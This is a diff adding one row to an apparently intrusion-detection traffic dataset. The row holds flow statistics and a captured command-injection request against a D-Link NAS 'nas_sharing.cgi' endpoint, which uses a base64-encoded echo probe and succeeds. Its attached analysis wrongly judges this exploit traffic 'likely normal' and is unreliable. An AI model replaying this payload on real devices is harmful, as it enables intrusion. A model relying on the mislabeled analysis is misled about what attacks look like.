@@ -1,0 +1,24 @@
+﻿src_ip,dst_ip,src_port,dst_port,u_avg_http_size,d_avg_http_size,u_var_http_size,d_var_http_size,u_avg_interval,d_avg_interval,u_var_interval,d_var_interval,stream_duration,request_count,response_count,status_codes,full_request,full_response,source_pcap,analysis_statistical_analysis,analysis_search_description
+209.141.46.203,95.229.154.68,55350,8080,385.6666666666667,351.3333333333333,6181.333333333333,161.33333333333331,1.2067539691925049,0.5218054294586182,0.0039148611249402,0.2116703066550542,2.839563131332397,3,3,"[""{'200': 3}""]","GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=ZWNobwlrSFBxR213WWtxcFJ1R08= HTTP/1.1
+Host: 95.229.154.68:8080
+Accept-Encoding: identity
+Cache-Control: no-cache, no-store, max-age=0
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36
+
+","HTTP/1.1 200 OK
+Content-Language: en
+P3P: CP='CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR'
+Transfer-Encoding: chunked
+Date: Thu, 10 Aug 2023 20:48:24 GMT
+Server: lighttpd/1.4.28
+
+10
+kHPqGmwYkqpRuGO
+
+6e
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>
+
+0
+
+",dlink_nas_sharing_tor2.pcap,"The traffic exhibits a balanced request and response count (3:3), which aligns with normal behavior where requests and responses are matched. The uplink and downlink packet sizes show significant variance, especially in the uplink (385.67±6181.3 bytes), indicating potential anomalies in data transmission. However, the downlink packet size variance is relatively low (351.33±161.3 bytes), suggesting normal behavior for responses. The time intervals for both uplink and downlink are consistent, with minimal variance, indicating no sudden bursts or high-frequency patterns typical of attacks. Given these observations, the traffic is likely normal, but the high variance in uplink packet sizes warrants further investigation to rule out data exfiltration or injection attempts.",anomalous uplink packet size variance
